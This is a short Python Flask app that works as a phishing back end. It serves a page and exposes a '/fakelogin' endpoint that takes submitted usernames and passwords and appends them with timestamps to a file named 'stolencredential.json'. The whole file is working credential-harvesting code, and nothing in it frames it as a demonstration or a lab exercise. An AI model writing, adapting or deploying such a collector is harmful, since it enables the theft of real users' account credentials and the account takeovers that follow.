from flask import Flask, request, render_template
from datetime import datetime
import json

app = Flask(__name__)

filename = "stolencredential.json"

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')


@app.route('/fakelogin', methods=['POST'])
def fakelogin():
     # Support JSON request
    if request.is_json:
        data = request.get_json()
        username = data.get("username")
        password = data.get("password")
    else:
        username = request.form.get("username")
        password = request.form.get("password")
    
    # Save to JSON format
    data = {
        "time": datetime.now().isoformat(),
        "username": username,
        "password": password
    }

    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(json.dumps(data) + "\n")
    except Exception as e:
        print(f"Error writing to file: {e}")  # Handle errors
    
    return "Credentials recorded successfully."

if __name__ == "__main__":
    app.run(debug=True)